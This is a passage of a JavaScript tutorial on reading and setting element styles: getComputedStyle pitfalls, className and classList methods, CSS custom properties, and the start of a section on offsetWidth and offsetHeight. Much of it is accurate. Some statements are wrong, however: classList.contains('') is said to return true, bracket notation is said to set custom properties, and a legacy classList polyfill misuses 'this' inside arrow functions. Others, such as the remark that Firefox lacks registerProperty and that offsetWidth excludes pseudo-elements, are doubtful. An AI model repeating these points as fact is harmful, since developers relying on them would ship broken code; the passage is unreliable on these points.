const newWidth = parseFloat(styles.width) + 10 + 'px'; // "210px"
```

**Pitfall 3: Modifying Returned Object**

```javascript
const styles = getComputedStyle(element);

// Wrong - read-only
styles.color = 'red'; // No effect, silently fails

// Correct - modify element.style
element.style.color = 'red';
```

**Pitfall 4: Not Accounting for Element State**

```javascript
// Element must be in document for accurate dimensions
const div = document.createElement('div');
const styles = getComputedStyle(div);
console.log(styles.width); // "auto" (not useful)

// Append first, then get styles
document.body.appendChild(div);
const stylesAfter = getComputedStyle(div);
console.log(stylesAfter.width); // Actual computed width
```

---

## CSS Class Manipulation Techniques

CSS class manipulation provides methods for dynamically adding, removing, and toggling classes on DOM elements, enabling responsive styling and state management without directly modifying inline styles.

### className Property

The `className` property gets or sets the entire `class` attribute value as a string.

```javascript
const element = document.getElementById('box');

// Get all classes
console.log(element.className); // "btn btn-primary active"

// Set classes (replaces all existing classes)
element.className = "btn btn-secondary";

// Add a class
element.className += " disabled";

// Clear all classes
element.className = "";
```

#### Characteristics

**String-Based**: Returns and accepts a space-separated string of class names. Multiple classes are separated by spaces.

**Complete Replacement**: Setting `className` replaces all existing classes, not just individual ones:

```javascript
element.className = "original-class";
element.className = "new-class"; // "original-class" is removed
```

**Whitespace Handling**: Extra whitespace is preserved but can cause issues:

```javascript
element.className = "btn  active"; // Double space preserved
console.log(element.classList.contains("active")); // true
console.log(element.classList.contains("")); // true (empty string class)
```

#### Parsing and Manipulation

Working with multiple classes requires string manipulation:

```javascript
// Check if class exists
const hasClass = element.className.split(' ').includes('active');

// Add class if not present
if (!element.className.split(' ').includes('new-class')) {
  element.className += ' new-class';
}

// Remove specific class
element.className = element.className
  .split(' ')
  .filter(cls => cls !== 'remove-me')
  .join(' ');

// Toggle class
const classes = element.className.split(' ');
const index = classes.indexOf('toggle-me');
if (index > -1) {
  classes.splice(index, 1);
} else {
  classes.push('toggle-me');
}
element.className = classes.join(' ');
```

#### Performance Considerations

Each assignment to `className` can trigger style recalculation and reflow:

```javascript
// Inefficient - multiple reflows
element.className = "class1";
element.className += " class2";
element.className += " class3";

// Efficient - single reflow
element.className = "class1 class2 class3";
```

#### SVG Elements

For SVG elements, use `className.baseVal` instead:

```javascript
const svgElement = document.querySelector('svg rect');

// Get classes
console.log(svgElement.className.baseVal);

// Set classes
svgElement.className.baseVal = "rect-class active";
```

### classList Property

The `classList` property returns a DOMTokenList object that represents the element's class attribute as a collection of tokens. It provides methods for manipulating individual classes without string parsing.

```javascript
const element = document.getElementById('box');
const classes = element.classList;

console.log(classes); // DOMTokenList ["btn", "btn-primary", "active"]
console.log(classes.length); // 3
```

#### DOMTokenList Characteristics

**Live Collection**: Automatically updates when classes change:

```javascript
const list = element.classList;
console.log(list.length); // 2

element.className += " new-class";
console.log(list.length); // 3 (automatically updated)
```

**Array-Like**: Supports numeric indexing and length property, but not array methods directly:

```javascript
console.log(element.classList[0]); // First class name
console.log(element.classList.length); // Number of classes

// Convert to array for array methods
const classArray = Array.from(element.classList);
const filtered = classArray.filter(cls => cls.startsWith('btn-'));
```

**Iterable**: Supports `for...of` and `forEach`:

```javascript
for (let className of element.classList) {
  console.log(className);
}

element.classList.forEach(className => {
  console.log(className);
});
```

### classList.add()

Adds one or more classes to the element. Ignores classes that already exist.

```javascript
element.classList.add('active');
element.classList.add('highlight', 'focus', 'new-class'); // Multiple classes
```

#### Behavior

**Duplicate Prevention**: Adding an existing class has no effect:

```javascript
element.className = "btn";
element.classList.add('btn'); // No change
console.log(element.className); // Still "btn" (not "btn btn")
```

**Multiple Arguments**: Accepts multiple class names in a single call:

```javascript
// Efficient
element.classList.add('class1', 'class2', 'class3');

// Less efficient
element.classList.add('class1');
element.classList.add('class2');
element.classList.add('class3');
```

**Invalid Class Names**: [Inference: Throws DOMException for invalid class names]

```javascript
// Invalid - contains whitespace
element.classList.add('class with spaces'); // Throws DOMException

// Invalid - empty string
element.classList.add(''); // Throws DOMException
```

#### Common Patterns

```javascript
// Conditional addition
if (condition) {
  element.classList.add('active');
}

// Add state class
function setLoadingState(element, isLoading) {
  if (isLoading) {
    element.classList.add('loading', 'disabled');
  }
}

// Add multiple related classes
element.classList.add('btn', 'btn-primary', 'btn-lg');
```

### classList.remove()

Removes one or more classes from the element. Ignores classes that don't exist.

```javascript
element.classList.remove('active');
element.classList.remove('highlight', 'focus', 'disabled'); // Multiple classes
```

#### Behavior

**Non-Existent Classes**: Removing a class that doesn't exist has no effect and throws no error:

```javascript
element.className = "btn";
element.classList.remove('active'); // No error, no change
```

**Multiple Arguments**: Removes multiple classes in one call:

```javascript
element.classList.remove('class1', 'class2', 'class3');
```

**Invalid Class Names**: [Inference: Throws DOMException for invalid class names]

```javascript
element.classList.remove(''); // Throws DOMException
```

#### Common Patterns

```javascript
// Conditional removal
if (!isActive) {
  element.classList.remove('active');
}

// Remove state classes
function clearStates(element) {
  element.classList.remove('loading', 'error', 'success');
}

// Reset to base classes
element.classList.remove('btn-primary', 'btn-secondary', 'btn-danger');
element.classList.add('btn-default');
```

### classList.toggle()

Toggles a class on the element - adds it if absent, removes it if present. Returns `true` if the class was added, `false` if removed.

```javascript
const wasAdded = element.classList.toggle('active');
console.log(wasAdded); // true if 'active' was added, false if removed
```

#### Force Parameter

The optional second parameter forces adding or removing:

```javascript
// Force add (same as add() but returns boolean)
element.classList.toggle('active', true); // Always adds, never removes

// Force remove (same as remove() but returns boolean)
element.classList.toggle('active', false); // Always removes, never adds

// Conditional toggle based on expression
element.classList.toggle('visible', width > 768);
element.classList.toggle('hidden', width <= 768);
```

#### Return Value Usage

```javascript
// Use return value to track state
const isActive = element.classList.toggle('active');
if (isActive) {
  console.log('Element is now active');
} else {
  console.log('Element is now inactive');
}

// Chain operations based on result
if (element.classList.toggle('expanded')) {
  expandContent();
} else {
  collapseContent();
}
```

#### Common Patterns

```javascript
// Toggle visibility
button.addEventListener('click', () => {
  menu.classList.toggle('visible');
});

// Toggle between states
function toggleTheme(element) {
  const isDark = element.classList.toggle('dark-theme');
  element.classList.toggle('light-theme', !isDark);
}

// Accordion behavior
function toggleAccordion(panel) {
  const isOpen = panel.classList.toggle('open');
  panel.style.maxHeight = isOpen ? panel.scrollHeight + 'px' : '0';
}

// Conditional toggle with force parameter
element.classList.toggle('disabled', !hasPermission);
element.classList.toggle('read-only', isViewMode);
```

### classList.contains()

Returns `true` if the element has the specified class, `false` otherwise.

```javascript
if (element.classList.contains('active')) {
  console.log('Element is active');
}
```

#### Case Sensitivity

Class names are case-sensitive in HTML (though in CSS selectors they may not be in certain contexts):

```javascript
element.className = "Active";
console.log(element.classList.contains('active')); // false
console.log(element.classList.contains('Active')); // true
```

#### Common Patterns

```javascript
// Conditional logic
if (element.classList.contains('disabled')) {
  return; // Don't process click
}

// State checking
function isVisible(element) {
  return !element.classList.contains('hidden');
}

// Multiple class checking
function hasAnyClass(element, classNames) {
  return classNames.some(cls => element.classList.contains(cls));
}

function hasAllClasses(element, classNames) {
  return classNames.every(cls => element.classList.contains(cls));
}

// Validation
if (!element.classList.contains('initialized')) {
  initialize(element);
  element.classList.add('initialized');
}
```

### classList.replace()

Replaces an existing class with a new class. Returns `true` if replacement occurred, `false` if the old class wasn't present.

```javascript
const wasReplaced = element.classList.replace('btn-primary', 'btn-secondary');
console.log(wasReplaced); // true if 'btn-primary' existed and was replaced
```

#### Behavior

**Atomic Operation**: Replaces in a single operation without intermediate state:

```javascript
// Using replace - atomic
element.classList.replace('old-class', 'new-class');

// Manual approach - two operations
element.classList.remove('old-class');
element.classList.add('new-class');
```

**Non-Existent Old Class**: Returns `false` if the old class doesn't exist; new class is not added:

```javascript
element.className = "other-class";
const replaced = element.classList.replace('not-there', 'new-class');
console.log(replaced); // false
console.log(element.className); // "other-class" (unchanged)
```

**Duplicate New Class**: If the new class already exists, the old class is still removed:

```javascript
element.className = "old-class new-class";
element.classList.replace('old-class', 'new-class');
console.log(element.className); // "new-class" (no duplicate)
```

#### Browser Support

Supported in modern browsers. For older browsers, fallback pattern:

```javascript
if (!element.classList.replace) {
  // Polyfill
  DOMTokenList.prototype.replace = function(oldClass, newClass) {
    if (this.contains(oldClass)) {
      this.remove(oldClass);
      this.add(newClass);
      return true;
    }
    return false;
  };
}
```

#### Common Patterns

```javascript
// Theme switching
element.classList.replace('theme-light', 'theme-dark');

// State transitions
button.classList.replace('btn-primary', 'btn-success');

// Size changes
element.classList.replace('size-sm', 'size-lg');

// Conditional replacement
function updateState(element, oldState, newState) {
  if (element.classList.replace(`state-${oldState}`, `state-${newState}`)) {
    console.log(`State changed from ${oldState} to ${newState}`);
  }
}
```

### classList.item()

Returns the class name at the specified index, or `null` if the index is out of range.

```javascript
element.className = "btn btn-primary active";
console.log(element.classList.item(0)); // "btn"
console.log(element.classList.item(1)); // "btn-primary"
console.log(element.classList.item(5)); // null
```

#### Array-Like Access

Bracket notation is more common and equivalent:

```javascript
console.log(element.classList[0]); // Same as item(0)
console.log(element.classList[1]); // Same as item(1)
```

#### Iteration Pattern

```javascript
// Using item()
for (let i = 0; i < element.classList.length; i++) {
  console.log(element.classList.item(i));
}

// Using bracket notation (more common)
for (let i = 0; i < element.classList.length; i++) {
  console.log(element.classList[i]);
}

// Modern iteration (preferred)
element.classList.forEach(className => {
  console.log(className);
});
```

### Advanced Manipulation Patterns

#### Batch Class Operations

```javascript
// Add multiple classes efficiently
function addClasses(element, ...classes) {
  element.classList.add(...classes);
}

// Remove multiple classes
function removeClasses(element, ...classes) {
  element.classList.remove(...classes);
}

// Replace multiple classes
function replaceClasses(element, oldClasses, newClasses) {
  removeClasses(element, ...oldClasses);
  addClasses(element, ...newClasses);
}

// Usage
addClasses(element, 'class1', 'class2', 'class3');
replaceClasses(element, ['old1', 'old2'], ['new1', 'new2']);
```

#### Conditional Class Application

```javascript
// Apply classes based on conditions
function applyConditionalClasses(element, classMap) {
  Object.entries(classMap).forEach(([className, condition]) => {
    element.classList.toggle(className, condition);
  });
}

// Usage
applyConditionalClasses(element, {
  'active': isActive,
  'disabled': !hasPermission,
  'large': size === 'lg',
  'hidden': !isVisible
});
```

#### State Management with Classes

```javascript
// Exclusive state classes (only one active)
function setExclusiveClass(element, stateClass, allStateClasses) {
  allStateClasses.forEach(cls => element.classList.remove(cls));
  element.classList.add(stateClass);
}

// Usage
const states = ['idle', 'loading', 'success', 'error'];
setExclusiveClass(button, 'loading', states);

// Grouped class management
function setButtonVariant(button, variant) {
  const variants = ['primary', 'secondary', 'success', 'danger', 'warning'];
  variants.forEach(v => button.classList.remove(`btn-${v}`));
  button.classList.add(`btn-${variant}`);
}
```

#### Dynamic Class Generation

```javascript
// BEM-style class generation
function bemClass(block, element = null, modifier = null) {
  let className = block;
  if (element) className += `__${element}`;
  if (modifier) className += `--${modifier}`;
  return className;
}

// Usage
const cardClass = bemClass('card'); // "card"
const cardTitleClass = bemClass('card', 'title'); // "card__title"
const cardActiveClass = bemClass('card', null, 'active'); // "card--active"

// Apply to element
element.classList.add(bemClass('button', null, 'primary'));
```

#### Prefix-Based Class Management

```javascript
// Remove all classes with specific prefix
function removeClassesWithPrefix(element, prefix) {
  const classesToRemove = Array.from(element.classList)
    .filter(cls => cls.startsWith(prefix));
  element.classList.remove(...classesToRemove);
}

// Add class and remove others with same prefix
function setClassWithPrefix(element, prefix, className) {
  removeClassesWithPrefix(element, prefix);
  element.classList.add(className);
}

// Usage
setClassWithPrefix(element, 'size-', 'size-large');
setClassWithPrefix(element, 'theme-', 'theme-dark');
```

#### Animation Classes

```javascript
// Add temporary animation class
function animateElement(element, animationClass, duration = 300) {
  element.classList.add(animationClass);
  
  return new Promise(resolve => {
    setTimeout(() => {
      element.classList.remove(animationClass);
      resolve();
    }, duration);
  });
}

// Usage
await animateElement(element, 'fade-in', 500);
console.log('Animation complete');

// Chain animations
async function chainAnimations(element, animations) {
  for (const anim of animations) {
    await animateElement(element, anim.class, anim.duration);
  }
}
```

#### Class Observation

```javascript
// Monitor class changes
function watchClasses(element, callback) {
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.attributeName === 'class') {
        callback(element.className, mutation.oldValue);
      }
    });
  });
  
  observer.observe(element, {
    attributes: true,
    attributeOldValue: true,
    attributeFilter: ['class']
  });
  
  return observer;
}

// Usage
const observer = watchClasses(element, (newClasses, oldClasses) => {
  console.log('Classes changed from:', oldClasses, 'to:', newClasses);
});

// Stop watching
observer.disconnect();
```

### Performance Optimization

#### Minimize Reflows

```javascript
// Inefficient - multiple reflows
element.classList.add('class1');
element.style.display = 'block';
element.classList.add('class2');
element.style.opacity = '1';

// Efficient - batch class changes
element.classList.add('class1', 'class2');
// Single style change or use classes for styling
element.classList.add('visible'); // CSS: .visible { display: block; opacity: 1; }
```

#### Use Classes Over Inline Styles

```javascript
// Less efficient - inline styles
element.style.color = 'red';
element.style.fontSize = '16px';
element.style.fontWeight = 'bold';

// More efficient - class-based styling
element.classList.add('error-text');
// CSS: .error-text { color: red; font-size: 16px; font-weight: bold; }
```

#### Cache classList Reference

```javascript
// Less efficient - repeated property access
for (let i = 0; i < 1000; i++) {
  elements[i].classList.add('processed');
}

// More efficient - cache when doing multiple operations
for (let i = 0; i < 1000; i++) {
  const classList = elements[i].classList;
  classList.add('processed');
  classList.remove('pending');
}
```

#### Batch DOM Queries

```javascript
// Inefficient - query DOM repeatedly
document.querySelectorAll('.item').forEach(item => {
  item.classList.add('processed');
});
document.querySelectorAll('.item').forEach(item => {
  item.classList.remove('pending');
});

// Efficient - single query, multiple operations
document.querySelectorAll('.item').forEach(item => {
  item.classList.add('processed');
  item.classList.remove('pending');
});
```

### Cross-Browser Compatibility

#### classList Polyfill for Legacy Browsers

[Unverified: Modern browsers all support classList]

For IE9 and below, a polyfill may be needed:

```javascript
if (!('classList' in document.documentElement)) {
  Object.defineProperty(Element.prototype, 'classList', {
    get: function() {
      const element = this;
      const classCache = element.className.split(/\s+/);
      
      return {
        contains: cls => classCache.indexOf(cls) > -1,
        add: cls => {
          if (!this.contains(cls)) {
            element.className += ' ' + cls;
          }
        },
        remove: cls => {
          element.className = element.className
            .split(/\s+/)
            .filter(c => c !== cls)
            .join(' ');
        },
        toggle: cls => {
          if (this.contains(cls)) {
            this.remove(cls);
            return false;
          } else {
            this.add(cls);
            return true;
          }
        }
      };
    }
  });
}
```

#### SVG Element Handling

SVG elements in older browsers require special handling:

```javascript
function addClassSVG(element, className) {
  if (element.classList) {
    element.classList.add(className);
  } else if (element.className.baseVal !== undefined) {
    // SVG element
    const classes = element.className.baseVal.split(' ');
    if (classes.indexOf(className) === -1) {
      element.className.baseVal += ' ' + className;
    }
  } else {
    // Fallback
    element.className += ' ' + className;
  }
}
```

### Testing and Debugging

#### Inspecting Classes

```javascript
// Log all classes
console.log('Classes:', Array.from(element.classList));

// Check specific class
console.log('Has "active"?', element.classList.contains('active'));

// Count classes
console.log('Number of classes:', element.classList.length);

// List classes with details
element.classList.forEach((cls, index) => {
  console.log(`[${index}]:`, cls);
});
```

#### Validation

```javascript
// Validate class name before adding
function isValidClassName(className) {
  // Class names cannot contain whitespace
  return typeof className === 'string' && 
         className.length > 0 && 
         !/\s/.test(className);
}

function safeAddClass(element, className) {
  if (isValidClassName(className)) {
    element.classList.add(className);
  } else {
    console.error('Invalid class name:', className);
  }
}
```

#### Class Diffing

```javascript
// Compare class lists
function getClassDiff(element, expectedClasses) {
  const actual = new Set(element.classList);
  const expected = new Set(expectedClasses);
  
  const missing = [...expected].filter(cls => !actual.has(cls));
  const extra = [...actual].filter(cls => !expected.has(cls));
  
  return { missing, extra };
}

// Usage
const diff = getClassDiff(element, ['btn', 'btn-primary', 'active']);
if (diff.missing.length) console.log('Missing:', diff.missing);
if (diff.extra.length) console.log('Extra:', diff.extra);
```

### Common Pitfalls

#### Whitespace in Class Names

```javascript
// Wrong - throws DOMException
element.classList.add('class with spaces');

// Correct - separate classes
element.classList.add('class', 'with', 'spaces');
```

#### Modifying During Iteration

```javascript
// Dangerous - modifying collection during iteration
element.classList.forEach(cls => {
  if (cls.startsWith('old-')) {
    element.classList.remove(cls); // Modifies collection being iterated
  }
});

// Safe - convert to array first
Array.from(element.classList)
  .filter(cls => cls.startsWith('old-'))
  .forEach(cls => element.classList.remove(cls));
```

#### Assuming className is Always a String

```javascript
// SVG elements have className as object
if (typeof element.className === 'string') {
  // HTML element
  element.className += ' new-class';
} else {
  // SVG element
  element.className.baseVal += ' new-class';
}

// Better - use classList (works for both)
element.classList.add('new-class');
```

#### Toggle Without Force Parameter

```javascript
// Ambiguous - relies on current state
element.classList.toggle('visible');

// Clear intent - explicit behavior
element.classList.toggle('visible', shouldBeVisible);
```

---

## CSS Custom Properties via JavaScript

### Reading Custom Properties

Custom properties (CSS variables) are accessed through the `getComputedStyle()` API and the `getPropertyValue()` method:

```javascript
const element = document.querySelector('.target');
const styles = getComputedStyle(element);
const value = styles.getPropertyValue('--my-color');
```

`getComputedStyle()` returns a `CSSStyleDeclaration` object containing all computed styles for the element, including inherited custom properties. The `getPropertyValue()` method retrieves the value of a specific property.

Custom property names must include the `--` prefix when accessed via JavaScript. The property name is case-sensitive.

**Return value characteristics:**

The returned value is a string containing exactly what's in the CSS, including leading/trailing whitespace:

```css
.element {
  --spacing: 20px;
  --color:   #ff0000  ;
}
```

```javascript
getComputedStyle(element).getPropertyValue('--spacing'); // "20px"
getComputedStyle(element).getPropertyValue('--color');   // "   #ff0000  "
```

Whitespace is preserved. Use `trim()` to remove it:

```javascript
const color = styles.getPropertyValue('--color').trim();
```

### Setting Custom Properties via Inline Styles

Custom properties are set through the `style` property using `setProperty()`:

```javascript
element.style.setProperty('--my-color', '#ff0000');
```

This creates an inline style declaration on the element, equivalent to:

```html
<div style="--my-color: #ff0000;"></div>
```

The `setProperty()` method accepts three parameters:

- `propertyName` - the custom property name with `--` prefix
- `value` - the property value as a string
- `priority` (optional) - empty string or `"important"`

**Setting with priority:**

```javascript
element.style.setProperty('--my-color', '#ff0000', 'important');
// Results in: --my-color: #ff0000 !important;
```

### Alternative Syntax for Setting Properties

Custom properties can be set directly via bracket notation or `cssText`:

```javascript
// Bracket notation
element.style['--my-color'] = '#ff0000';

// cssText (replaces all inline styles)
element.style.cssText = '--my-color: #ff0000; --spacing: 20px;';
```

The bracket notation is less common and may be less clear than `setProperty()`. The `cssText` approach replaces all existing inline styles, not just custom properties.

### Removing Custom Properties

Remove custom properties using `removeProperty()`:

```javascript
element.style.removeProperty('--my-color');
```

This removes the property from the element's inline styles. If the property is defined in a stylesheet, the cascaded value from the stylesheet becomes active again.

Setting a custom property to an empty string also removes it:

```javascript
element.style.setProperty('--my-color', '');
```

Both approaches achieve the same result for inline styles.

### Checking if Custom Property Exists

Check if an element has a specific custom property value:

```javascript
const value = getComputedStyle(element).getPropertyValue('--my-color');
const exists = value !== '';
```

An empty string indicates the property isn't defined anywhere in the cascade for that element.

For inline styles specifically:

```javascript
const hasInline = element.style.getPropertyValue('--my-color') !== '';
```

The `element.style` property only reflects inline styles, while `getComputedStyle()` reflects the final computed value after the cascade.

### Scope and Inheritance

Custom properties follow CSS cascade and inheritance rules. Properties defined on ancestors are inherited by descendants unless overridden:

```css
:root {
  --primary: #0066cc;
}

.child {
  --primary: #ff0000;
}
```

```javascript
const root = document.documentElement;
const child = document.querySelector('.child');

getComputedStyle(root).getPropertyValue('--primary');  // "#0066cc"
getComputedStyle(child).getPropertyValue('--primary'); // "#ff0000"
```

Setting a custom property on an element affects that element and its descendants:

```javascript
document.documentElement.style.setProperty('--theme-color', '#0066cc');
// Now available to all descendants
```

### Setting Properties on :root

The `:root` pseudo-class (equivalent to `<html>`) is the common location for global custom properties:

```javascript
document.documentElement.style.setProperty('--global-spacing', '16px');
```

`document.documentElement` references the root `<html>` element. Properties set here inherit throughout the document unless overridden.

Alternatively, access via `document.querySelector(':root')`:

```javascript
const root = document.querySelector(':root');
root.style.setProperty('--primary', '#0066cc');
```

Both approaches reference the same element.

### Dynamic Theme Switching

Custom properties enable runtime theme changes:

```javascript
function setTheme(theme) {
  const root = document.documentElement;
  
  if (theme === 'dark') {
    root.style.setProperty('--bg-color', '#1a1a1a');
    root.style.setProperty('--text-color', '#ffffff');
    root.style.setProperty('--accent', '#6699ff');
  } else {
    root.style.setProperty('--bg-color', '#ffffff');
    root.style.setProperty('--text-color', '#000000');
    root.style.setProperty('--accent', '#0066cc');
  }
}
```

All elements using these custom properties update immediately when values change.

### Computed vs Declared Values

`getComputedStyle()` returns the computed value, not the declared value. For custom properties, the computed value is the declared value with whitespace preserved:

```css
.element {
  --size: calc(10px + 5px);
}
```

```javascript
getComputedStyle(element).getPropertyValue('--size'); // "calc(10px + 5px)"
```

Custom properties store their values verbatim. The `calc()` isn't evaluated until the property is used in a regular CSS property.

When a custom property is used:

```css
.element {
  --size: calc(10px + 5px);
  width: var(--size);
}
```

```javascript
getComputedStyle(element).getPropertyValue('width'); // "15px"
getComputedStyle(element).getPropertyValue('--size'); // "calc(10px + 5px)"
```

The `width` property shows the evaluated result, while `--size` retains the original expression.

### Invalid Values and Fallbacks

[Inference] When a custom property contains an invalid value for the property using it, the property becomes invalid at computed-value time and uses the inherited value or initial value:

```css
.element {
  --color: not-a-color;
  color: var(--color);
  /* color becomes 'inherit' or 'initial', not 'not-a-color' */
}
```

JavaScript cannot detect this invalidity when reading the custom property:

```javascript
getComputedStyle(element).getPropertyValue('--color'); // "not-a-color"
```

The invalid value is stored and returned. Validation occurs when the property is applied.

### Reading Properties Before Insertion

Custom properties can be read from detached elements:

```javascript
const div = document.createElement('div');
div.style.setProperty('--custom', 'value');

div.style.getPropertyValue('--custom'); // "value"
getComputedStyle(div).getPropertyValue('--custom'); // ""
```

Inline styles (via `element.style`) are readable immediately. Computed styles from detached elements generally return empty values or initial values since they aren't in the cascade.

### Animating Custom Properties

Custom properties can be animated via JavaScript:

```javascript
let value = 0;
const element = document.querySelector('.box');

function animate() {
  value += 1;
  element.style.setProperty('--rotation', `${value}deg`);
  
  if (value < 360) {
    requestAnimationFrame(animate);
  }
}

animate();
```

CSS can then use the custom property:

```css
.box {
  transform: rotate(var(--rotation, 0deg));
}
```

This approach enables JavaScript-driven animations that leverage CSS custom properties for separation of concerns.

### Performance Considerations

[Inference] Setting custom properties triggers style recalculation for the element and its descendants using those properties. Frequent updates can impact performance:

**Optimization strategies:**

- Minimize cascade depth where custom properties are used
- Update properties on the most specific element possible rather than root
- Batch multiple property updates when feasible
- Use `requestAnimationFrame()` for animation-related updates
- Consider CSS transitions/animations for smoother visual changes

[Inference] Modern browsers optimize custom property updates efficiently, but excessive updates (hundreds per second across many properties) may cause performance degradation.

### CSSStyleSheet API Integration

The CSS Object Model (CSSOM) provides programmatic stylesheet access:

```javascript
const sheet = document.styleSheets[0];
const rules = sheet.cssRules;

for (let rule of rules) {
  if (rule.style) {
    // Read custom properties
    const value = rule.style.getPropertyValue('--custom');
    
    // Set custom properties
    rule.style.setProperty('--custom', 'new-value');
  }
}
```

This modifies stylesheet rules directly, affecting all elements matching those rules. Changes persist across the stylesheet, not just inline styles.

### Constructable Stylesheets

Constructable stylesheets enable dynamic style creation:

```javascript
const sheet = new CSSStyleSheet();
sheet.replaceSync(`
  :root {
    --dynamic-color: #ff0000;
  }
`);

document.adoptedStyleSheets = [sheet];
```

Custom properties in constructable stylesheets are accessible via `getComputedStyle()` but not directly modifiable via the CSSStyleSheet API. [Inference] Modifying requires replacing the entire rule or using inline styles.

### CSS.registerProperty

The CSS Properties and Values API enables typed custom properties with defaults and inheritance control:

```javascript
CSS.registerProperty({
  name: '--my-color',
  syntax: '<color>',
  initialValue: '#000000',
  inherits: true
});
```

After registration, the custom property:

- Validates values against the specified syntax
- Provides a default value when undefined
- Controls inheritance behavior
- Enables smooth transitions and animations

Registered properties are still accessed via the same JavaScript APIs:

```javascript
element.style.setProperty('--my-color', '#ff0000');
getComputedStyle(element).getPropertyValue('--my-color'); // "#ff0000"
```

[Unverified] Browser support for `CSS.registerProperty` is modern browsers only (Chrome 78+, Edge 79+, Safari 16.4+). Firefox support is in development.

### Reading from Pseudo-elements

Custom properties on pseudo-elements are accessible:

```css
.element::before {
  --pseudo-color: #ff0000;
  content: '';
}
```

```javascript
const element = document.querySelector('.element');
const beforeStyles = getComputedStyle(element, '::before');
const color = beforeStyles.getPropertyValue('--pseudo-color');
```

The second argument to `getComputedStyle()` specifies the pseudo-element string. Standard pseudo-elements like `::before`, `::after`, `::first-line`, and `::first-letter` are supported.

Setting properties on pseudo-elements requires stylesheet manipulation; inline styles don't affect pseudo-elements.

### Retrieving All Custom Properties

[Inference] No native API lists all custom properties on an element. Iteration requires checking the computed style object:

```javascript
const styles = getComputedStyle(element);
const customProps = [];

for (let prop of styles) {
  if (prop.startsWith('--')) {
    customProps.push({
      name: prop,
      value: styles.getPropertyValue(prop)
    });
  }
}
```

This iterates through all computed properties, filtering for names starting with `--`.

[Unverified] The iteration approach may not capture all inherited custom properties in all browser implementations. Testing across browsers is recommended for critical functionality.

### Type Coercion and Parsing

Custom property values are always strings. Type conversion is manual:

```javascript
const spacing = getComputedStyle(element).getPropertyValue('--spacing').trim();
const spacingNum = parseFloat(spacing); // Converts "20px" to 20

const opacity = getComputedStyle(element).getPropertyValue('--opacity').trim();
const opacityNum = Number(opacity); // Converts "0.5" to 0.5
```

For complex values (colors, transforms), parsing requires additional libraries or regex:

```javascript
const color = getComputedStyle(element).getPropertyValue('--color').trim();
// Parse "#ff0000" or "rgb(255, 0, 0)" as needed
```

CSS custom properties don't provide automatic type conversion or structured value objects.

### Integration with Web Animations API

Custom properties work with the Web Animations API for declarative animations:

```javascript
element.animate(
  [
    { '--rotation': '0deg' },
    { '--rotation': '360deg' }
  ],
  {
    duration: 1000,
    iterations: Infinity
  }
);
```

[Unverified] Animating custom properties via the Web Animations API requires the property to be registered with `CSS.registerProperty()` for smooth interpolation. Unregistered properties may animate discretely rather than smoothly.

### CSS Variables in Inline Event Handlers

Custom properties set via JavaScript are accessible in CSS immediately:

```javascript
element.style.setProperty('--hover-color', '#ff0000');
```

```css
.element:hover {
  background: var(--hover-color, blue);
}
```

The hover state uses the dynamically-set value. This pattern enables JavaScript-controlled styling that leverages CSS selectors and pseudo-classes.

### Reading Properties from Different Documents

[Inference] Custom properties in iframes or different documents require accessing that document's elements:

```javascript
const iframe = document.querySelector('iframe');
const iframeDoc = iframe.contentDocument;
const iframeElement = iframeDoc.querySelector('.target');

const value = getComputedStyle(iframeElement).getPropertyValue('--custom');
```

Cross-origin restrictions apply. Same-origin iframes allow full access; cross-origin iframes block access to content.

### Common Patterns

**Responsive spacing system:**

```javascript
function updateSpacing() {
  const root = document.documentElement;
  const width = window.innerWidth;
  
  if (width < 768) {
    root.style.setProperty('--spacing-unit', '8px');
  } else if (width < 1024) {
    root.style.setProperty('--spacing-unit', '12px');
  } else {
    root.style.setProperty('--spacing-unit', '16px');
  }
}

window.addEventListener('resize', updateSpacing);
updateSpacing();
```

**User preference storage:**

```javascript
function loadThemePreferences() {
  const root = document.documentElement;
  const preferences = JSON.parse(localStorage.getItem('theme') || '{}');
  
  Object.entries(preferences).forEach(([prop, value]) => {
    root.style.setProperty(prop, value);
  });
}

function saveThemePreferences() {
  const root = document.documentElement;
  const style = root.style;
  const preferences = {};
  
  for (let i = 0; i < style.length; i++) {
    const prop = style[i];
    if (prop.startsWith('--')) {
      preferences[prop] = style.getPropertyValue(prop);
    }
  }
  
  localStorage.setItem('theme', JSON.stringify(preferences));
}
```

**Component-scoped variables:**

```javascript
class ThemedComponent {
  constructor(element) {
    this.element = element;
    this.setupTheme();
  }
  
  setupTheme() {
    this.element.style.setProperty('--component-bg', '#ffffff');
    this.element.style.setProperty('--component-text', '#000000');
  }
  
  setTheme(theme) {
    const colors = theme === 'dark' 
      ? { bg: '#1a1a1a', text: '#ffffff' }
      : { bg: '#ffffff', text: '#000000' };
    
    this.element.style.setProperty('--component-bg', colors.bg);
    this.element.style.setProperty('--component-text', colors.text);
  }
}
```

### Debugging Custom Properties

Browser DevTools display custom properties in the Computed or Styles panel. For programmatic debugging:

```javascript
function debugCustomProps(element) {
  const styles = getComputedStyle(element);
  const props = {};
  
  for (let prop of styles) {
    if (prop.startsWith('--')) {
      props[prop] = styles.getPropertyValue(prop).trim();
    }
  }
  
  console.table(props);
}

debugCustomProps(document.documentElement);
```

This logs all custom properties and values for inspection.

### Fallback Handling

The `var()` function in CSS accepts a fallback value. JavaScript doesn't affect this mechanism:

```css
.element {
  color: var(--text-color, black);
}
```

If `--text-color` is undefined or invalid, `black` is used. JavaScript reads the custom property value, not the resolved fallback:

```javascript
// If --text-color is undefined
getComputedStyle(element).getPropertyValue('--text-color'); // ""
getComputedStyle(element).getPropertyValue('color'); // "rgb(0, 0, 0)"
```

The `color` property shows the resolved value including fallback; the custom property returns empty string when undefined.

---

# Element Dimensions and Positioning

## offsetWidth and offsetHeight

### Core Behavior

`offsetWidth` and `offsetHeight` are read-only properties that return the layout dimensions of an element in pixels as integers. These properties measure:

- **offsetWidth**: content width + horizontal padding + vertical scrollbar width (if rendered) + border width
- **offsetHeight**: content height + vertical padding + horizontal scrollbar height (if rendered) + border height

The values are rounded to the nearest integer. For inline elements with no layout box, both properties return `0`.

### Calculation Formula

```
offsetWidth = content width + paddingLeft + paddingRight + borderLeftWidth + borderRightWidth + vertical scrollbar width
offsetHeight = content height + paddingTop + paddingBottom + borderTopWidth + borderBottomWidth + horizontal scrollbar width
```

Margin is **not** included in either calculation.

### What Gets Included

**Included components:**

- Content dimensions (accounting for box-sizing)
- All padding (left, right, top, bottom)
- All borders (left, right, top, bottom)
- Scrollbar dimensions (when rendered and overlaying content)

**Excluded components:**

- Margins
- Pseudo-elements (::before, ::after)
